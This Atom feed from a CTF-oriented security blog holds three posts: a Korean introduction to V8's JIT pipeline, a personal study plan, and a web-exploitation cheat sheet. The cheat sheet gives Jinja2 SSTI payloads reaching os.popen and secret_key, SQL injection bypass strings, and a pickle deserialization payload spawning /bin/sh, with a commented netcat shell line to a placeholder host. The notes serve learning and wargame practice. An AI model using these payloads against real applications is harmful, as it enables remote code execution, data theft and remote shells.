<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-19T13:57:08+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hacky Life &amp;amp; Writeup</title><subtitle>be the special st4rlight in the world 🌠</subtitle><author><name>st4rlight (Ainsetin)</name></author><entry><title type="html">[V8 Study] 00-introduction</title><link href="http://localhost:4000/note/V8-introduction/" rel="alternate" type="text/html" title="[V8 Study] 00-introduction" /><published>2022-05-17T16:30:00+09:00</published><updated>2022-05-17T16:30:00+09:00</updated><id>http://localhost:4000/note/V8-introduction</id><content type="html" xml:base="http://localhost:4000/note/V8-introduction/"><![CDATA[<p><strong>[!] 우선적으로 한글로 작성하여 추후 번역할 예정.</strong></p>

<h2 id="summary">Summary</h2>
<p>우리가 대중적으로 사용하는 Google Chrome browser에는 웹페이지를 동적으로 실행시키기 위해 javascript가 구동될 수 있도록 지원하고 있다. 그렇다면, JS를 원활하게 실행하고 컴파일하는 역할은 어떤 것이 맡고 있을까? 이 챕터에서는 내가 공부했던 chromium javascript engine인 V8에 대해서 알아보고자 한다.</p>

<h2 id="v8의-구조는-어떻게-되어-있을까">V8의 구조는 어떻게 되어 있을까?</h2>

<p>V8같은 경우 Chrome 구동 시 하나의 프로세스로 실행되어 heap 및 stack 메모리 영역을 관리하면서 Javascript의 각종 변수와 메소드를 실행하는 가장 핵심적인 execution file로 동작한다. 이외에 Task/Callback queue, Microtask queue, WebAPI 등 다양한 요소가 Chromium browser를 구성하고 동작하는데 사용된다.</p>

<p>가장 대표적인 역할은 javascript 코드를 컴파일된 컴퓨터에 최적화된 코드로 변환시켜 전달하게 된다는 것이다. 이때 <code class="language-plaintext highlighter-rouge">JIT(Just-In-Time) Compiler</code>라는 독창적인 컴파일러를 사용한다.</p>

<h2 id="v8만의-특징은-무엇이-있을까">V8만의 특징은 무엇이 있을까?</h2>
<p><img src="/images/2022-V8/intro/inter-comp.png" alt="inter-comp.png" /></p>

<p>우선 인터프리터와 컴파일러에 대해 알아야 할 것이다.</p>
<ol>
  <li>인터프리터
    <ul>
      <li>장점 : 한 줄 한 줄 변환하기 때문에 실행 속도가 빠르다.</li>
      <li>단점 : 자바스크립트 코드가 복잡해질수록 점점 속도가 느려진다. 예를 들어, 같은 코드를 여러차례 반복하는 반복문의 경우, 같은 결과를 반복하는 것임에도 불구하고 코드를 한 줄 한 줄 읽는 방식에 의해 그때그때 실행된다.</li>
    </ul>
  </li>
  <li>컴파일러
    <ul>
      <li>장점 : 파일 전체를 한번에 읽어서 컴파일러는 작업을 단순화시킨다. 예를 들어 특정 함수를 10억번 반복해야 할 경우, 컴파일 과정에서 함수를 반복하는 것이 아니라 함수의 결과물을 반복하도록 컴파일 한다. 이처럼 불필요한 동작을 제거하는 컴파일러의 방식을 최적화, <code class="language-plaintext highlighter-rouge">optimization</code>이라고 한다.<br />
(<em>인터프리터는 optimize하지 않는다</em> )</li>
      <li>단점 : 코드를 바로 실행하지 않고, 코드 실행 전 전체를 컴파일 하는 과정이 필요하기 때문에 초기에 속도가 느릴 수 밖에 없다.</li>
    </ul>
  </li>
</ol>

<p>자바스크립트 엔진의 내부를 공부하다가 잠시 인터프리터와 컴파일러의 간단한 개념과 장단점을 짚어봤다. 그러면 과연 V8 엔진은 어떤 방식을 취했길래 다른 자바스크립트 엔진보다 더 빠르고 효율적으로 자바스크립트 명령을 수행할 수 있을까? 바로 여기에서 V8 엔진의 독특한 언어 변환 도구인 JIT Compiler가 들어온다. JIT은 Just In Time의 약자이다.</p>

<h2 id="jit-compiler의-구조">JIT Compiler의 구조</h2>
<p><img src="/images/2022-V8/intro/jit.png" alt="jit.png" /></p>

<p>V8 엔진은 다음과 같은 구조로 되어 있다.</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">Parser</code> : 코드를 Lexical Analysis라는 과정을 통해 <strong>토큰</strong>으로 분해한다.</li>
  <li><code class="language-plaintext highlighter-rouge">AST(Abstract Syntax Tree)</code> : Parser에서 분해된 토큰을 바탕으로 추상적인 트리를 생성한다.</li>
  <li><code class="language-plaintext highlighter-rouge">Ignition</code> : AST에서 나온 트리를 V8의 인터프리터인 ignition에게 전달하고 이것을 인터프리터는 bytecode로 변환시킨다. (High-level Lang to Low-level Lang)</li>
  <li><code class="language-plaintext highlighter-rouge">TurboFan</code>, <code class="language-plaintext highlighter-rouge">Profiler</code> : bytecode를 실행하여 Human-readable Lang을 실행시키고, 그중 자주 사용되는 코드라고 판별된 코드 조각은 <code class="language-plaintext highlighter-rouge">TurboFan</code>으로 보내져 최적화를 수행하여 새로운 컴파일된 코드로 재구성된다. (이때 자주 사용되는 코드라는 말이 매우 추상적이므로 <code class="language-plaintext highlighter-rouge">Profiler</code> 라는 친구한테 사용 빈도 수 등을 수집하게끔 역할을 부여하고, 모인 데이터를 통해 Turbofan의 알고리즘대로 최적화를 한다)</li>
</ol>

<h2 id="turbofan은-어떤-조건으로-최적화하는-걸까">Turbofan은 어떤 조건으로 최적화하는 걸까?</h2>
<ol>
  <li>
    <p>코드가 뜨겁고 안정적인 것, 쉽게 말하면 자주 호출되고(뜨겁고) 코드가 안 변함(안정적)이라는 것이다. 매번 같은 행동을 수행하는 반복문 내에 있는 코드 같은 경우가 여기에 해당하기 쉽다.</p>
  </li>
  <li>
    <p>인터프리팅된 바이트 코드의 길이를 보고 특정 임계점을 넘기지 않으면 작은 함수라고 판단해서 최적화를 진행하는 것이다. 작고 단순한 함수는 크고 복잡한 함수보다 동작이 매우 추상적이거나 제한적인 확률이 높기 때문에 안정적이라고 볼 수 있다.</p>
  </li>
</ol>

<p>[!] 그러나, 컴파일러는 100% 완벽하지 못하기 때문에 의도와 다르게 발적화(deoptimization)가 일어날 수도 있다.</p>

<h2 id="next-topic">Next Topic</h2>
<p>다음에는 V8에서 자료형이나 JS의 다양한 메소드가 어떤 식으로 저장이 되고 불러올 수 있는지를 알아보고자 한다.</p>

<h2 id="reference">reference</h2>
<ul>
  <li><a href="https://dkwjdi.tistory.com/194">https://dkwjdi.tistory.com/194</a></li>
  <li><a href="https://github.com/danbev/learning-v8/blob/master/notes/intro.md">https://github.com/danbev/learning-v8/blob/master/notes/intro.md</a></li>
</ul>]]></content><author><name>st4rlight (Ainsetin)</name></author><category term="note" /><summary type="html"><![CDATA[useful browser engine process for beginner]]></summary></entry><entry><title type="html">Personal R&amp;amp;D plan beginning from ‘now’</title><link href="http://localhost:4000/life/list-after-graduate/" rel="alternate" type="text/html" title="Personal R&amp;amp;D plan beginning from ‘now’" /><published>2021-11-08T17:00:00+09:00</published><updated>2021-11-08T17:00:00+09:00</updated><id>http://localhost:4000/life/list-after-graduate</id><content type="html" xml:base="http://localhost:4000/life/list-after-graduate/"><![CDATA[<p><strong>UPDATED : 19 JUL 2024 13:00 UTC+9 KST</strong>
<strong>That would be LAST UPDATE, Let’s plan more!</strong></p>

<p>This is my plan to be finished until/after graduating.</p>

<h2 id="research">Research</h2>
<blockquote>
  <p>§ must be finished until new year’s day §</p>
  <ol>
    <li><del>Kernel : Dirty Cow Analysis (CVE-2016-5195) -Complete</del></li>
    <li><del>Browser V8 : Study/Build V8 frequently and get shell from V8 Engine -Complete</del></li>
  </ol>
</blockquote>

<h2 id="develop">Develop</h2>
<blockquote>
  <p>§ new year STUDY plan §</p>
  <ol>
    <li><del>Making interpreter/compiler with Rust (With Chris Ohk, ..)</del>
s
      <h2 id="goal">Goal</h2>
      <ul>
        <li>Try something <strong>“new”</strong>, <a href="https://youtu.be/c6rP-YP4c5I"><strong>Try Everything</strong></a></li>
        <li><del>Pass any awesome Univ.’s admission (Complete)</del></li>
        <li><del>Pass drive license (Complete)</del></li>
        <li>Dreamhack Wargame 1st
          <ul>
            <li><del>Format Sniper (Learn &amp; Analyze about FSB, Solved :D)</del></li>
            <li><del>Dreamcurl (Rev O, Crypto X. So learn mathematics!, Solved :D)</del></li>
            <li><del>Unibitmap (Solved :D)</del></li>
            <li><del>dreamboard v2 (V8 : Solved :D)</del></li>
          </ul>
        </li>
        <li><del>Purchase another laptop (<code class="language-plaintext highlighter-rouge">DELL XPS 15 12th generation Intel CPU</code>)</del></li>
        <li>BoB (Best of the Best) 14th? 15th?</li>
        <li>Try to be the BEST without <code class="language-plaintext highlighter-rouge">competitive mind</code>, Just <code class="language-plaintext highlighter-rouge">enjoy</code></li>
      </ul>
    </li>
  </ol>
</blockquote>]]></content><author><name>st4rlight (Ainsetin)</name></author><category term="life" /><summary type="html"><![CDATA[2022년 앞으로의 계획 및 마음가짐을 적었던 곳]]></summary></entry><entry><title type="html">web note (update 2021.10.27)</title><link href="http://localhost:4000/note/web-note-update/" rel="alternate" type="text/html" title="web note (update 2021.10.27)" /><published>2021-10-27T10:00:00+09:00</published><updated>2021-10-27T10:00:00+09:00</updated><id>http://localhost:4000/note/web-note-update</id><content type="html" xml:base="http://localhost:4000/note/web-note-update/"><![CDATA[<p><em>post will be frequently updated</em></p>

<h2 id="ssti-server-side-template-injection">SSTI (Server Side Template Injection)</h2>
<p>해당 취약점은 웹 프레임워크에서 사용되는 여러 가지 Template Engine에서 발생하며, 특별한 구문을 통해 <code class="language-plaintext highlighter-rouge">RCE</code>를 일으킬 수도 있다.<br />
This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.</p>

<p>▶ jinja2</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 기본
</span><span class="p">{{</span> <span class="mi">4</span><span class="o">*</span><span class="mi">4</span> <span class="p">}}</span> <span class="o">=&gt;</span> <span class="mi">16</span>

<span class="c1"># check with config
</span><span class="p">{{</span> <span class="n">config</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">items</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">secret_key</span><span class="sh">'</span><span class="p">]</span> <span class="p">}}</span>

<span class="c1"># RCE with config
</span><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">].</span><span class="nf">popen</span><span class="p">(</span><span class="sh">"</span><span class="s">ls</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="p">(</span><span class="n">config</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">"</span><span class="s">__class__</span><span class="sh">"</span><span class="p">)).</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">].</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>

<span class="c1"># etc ('',(),get_flashed_messages, url_for, ...)
</span><span class="p">{{</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="o">**</span><span class="n">index</span><span class="o">**</span><span class="p">](</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">).</span><span class="nf">communicate</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">get_flashed_messages</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">url_for</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nf">eval</span><span class="p">(</span><span class="sh">'</span><span class="s">__import__(</span><span class="sh">"</span><span class="s">os</span><span class="sh">"</span><span class="s">).popen(</span><span class="sh">"</span><span class="s">ls -al</span><span class="sh">"</span><span class="s">).read()</span><span class="sh">'</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div></div>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># with request - 필터링이 매우 많을 경우 more query + request를 활용하여 우회
</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">foo</span><span class="p">.</span><span class="n">bar</span><span class="o">/</span><span class="err">?</span><span class="n">payload</span><span class="o">=</span><span class="p">{{</span> <span class="n">request</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">class</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">mro</span><span class="sh">'</span><span class="p">))</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">getitem</span><span class="sh">'</span><span class="p">))(</span><span class="mi">1</span><span class="p">)</span> <span class="p">}}</span><span class="o">&amp;</span><span class="n">class</span><span class="o">=</span><span class="n">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="n">__mro__</span><span class="o">&amp;</span><span class="n">getitem</span><span class="o">=</span><span class="n">__getitem__</span>
<span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">application</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__globals__</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__getitem__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__getitem__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">popen</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">)()}}</span>
</code></pre></div></div>

<p><br /></p>

<h2 id="sqli-sql-injection">SQLI (sql injection)</h2>
<p>해당 취약점은 DB를 관리하는 응용 프로그램에서 SQL 쿼리를 전달할 때 의도하지 않은 구문을 전달할 수 있도록 변조시키는 데 목적이 있다.<br />
The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.</p>

<p><strong>1. Comment symbol</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/* ~ */</code>, <code class="language-plaintext highlighter-rouge">-- ~</code>, <code class="language-plaintext highlighter-rouge">#</code> (URL encoded : <code class="language-plaintext highlighter-rouge">%23</code>)</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- example.</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'(user_input)'</span>

<span class="c1">-- Select ALL query from tbl</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1-- "</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--'</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1#"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1/*1234*/"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="cm">/*1234*/</span><span class="s1">' ...?
(must have closed symbol)
</span></code></pre></div></div>

<p><strong>2. with single quarter</strong></p>
<ul>
  <li>id가 <code class="language-plaintext highlighter-rouge">''</code>로 감싸져 있을 경우 <code class="language-plaintext highlighter-rouge">'</code>를 input으로 넣어 먼저 닫아주게끔 한 뒤 조건문을 이어준다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- example.</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'(user_input)'</span>

<span class="c1">-- Select ALL query from tbl</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1='1"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="s1">'1'</span>
</code></pre></div></div>

<p><strong>3. and, or, &amp;&amp;, ||, in, between, like</strong></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- and, or</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span> <span class="k">and</span> <span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span> <span class="k">or</span> <span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>

<span class="c1">-- &amp;&amp;, || (no space required)</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span><span class="o">&amp;&amp;</span><span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span><span class="o">||</span><span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>

<span class="c1">-- in</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span> <span class="k">in</span> <span class="s1">'1234'</span> <span class="k">and</span> <span class="n">pw</span> <span class="k">in</span> <span class="s1">'5678'</span>

<span class="c1">-- between and (both number and char are possible)</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">age</span> <span class="k">between</span> <span class="mi">20</span> <span class="k">and</span> <span class="mi">30</span> <span class="c1">-- 20&lt;=age&lt;=30</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">score</span> <span class="k">between</span> <span class="s1">'A'</span> <span class="k">and</span> <span class="s1">'C'</span> <span class="c1">-- 'A'&lt;=score&lt;='C'</span>

<span class="c1">--like (starts with ~, ends with ~, include ~, length)</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'Bae%'</span> <span class="c1">-- starts with Bae</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'%uk'</span> <span class="c1">-- ends with uk</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'%won%'</span> <span class="c1">-- include won</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'___'</span> <span class="c1">-- length 3 chars</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="nb">binary</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'~'</span> <span class="c1">-- distinguish upper/lower</span>
</code></pre></div></div>

<p><strong>4. Internal function in mysql</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">char(...)</code> : change integer arguments to char (ex. <code class="language-plaintext highlighter-rouge">char(0x61,0x62,0x63)</code>=&gt;<code class="language-plaintext highlighter-rouge">"abc"</code>)</li>
  <li><code class="language-plaintext highlighter-rouge">mid/substr[ing](a,b,c)</code> : get <code class="language-plaintext highlighter-rouge">c</code> bytes in <code class="language-plaintext highlighter-rouge">a</code> from <code class="language-plaintext highlighter-rouge">b(starts from 1 ~ ..)</code></li>
  <li><code class="language-plaintext highlighter-rouge">left(a,b)</code> / <code class="language-plaintext highlighter-rouge">right(a,b)</code> : get <code class="language-plaintext highlighter-rouge">b</code> bytes in <code class="language-plaintext highlighter-rouge">a</code> (begin / end(reverse but print correctly))</li>
  <li><code class="language-plaintext highlighter-rouge">version()</code> : get mysql version</li>
  <li><code class="language-plaintext highlighter-rouge">database()</code> : get current database</li>
</ul>

<p><br /></p>

<h2 id="python-pickle-deserialization">python pickle deserialization</h2>
<p><code class="language-plaintext highlighter-rouge">pickle</code>로 직렬화된 객체가 변조되어 역직렬화하는 과정에서 시스템에 접근하거나 의도치 않은 것이 실행되기도 한다. 원하는 class를 선언한 뒤, <code class="language-plaintext highlighter-rouge">__reduce__</code>를 통하여 <code class="language-plaintext highlighter-rouge">pickle.loads</code> 함수에서 unpickle 시 <code class="language-plaintext highlighter-rouge">tuple</code>을 반환하여 함수를 실행시킬 수 있다.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">pickle</span>

<span class="k">class</span> <span class="nc">payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
  <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
    <span class="c1">#return (os.system, ('ls', ))
</span>    <span class="c1">#return (os.system, ('cat flag', ))
</span>    <span class="nf">return </span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">,</span> <span class="p">))</span>
    <span class="c1">#return (os.system, ('/bin/sh | nc [ip] [port]', ))
</span>
<span class="n">pickle_d</span><span class="o">=</span><span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nf">payload</span><span class="p">())</span>
<span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">pickle_d</span><span class="p">)</span> <span class="c1"># get shell anyway
</span></code></pre></div></div>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="nb">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
</code></pre></div></div>

<p>update 예정.</p>]]></content><author><name>st4rlight (Ainsetin)</name></author><category term="note" /><summary type="html"><![CDATA[web exploitation note by using many ways]]></summary></entry></feed>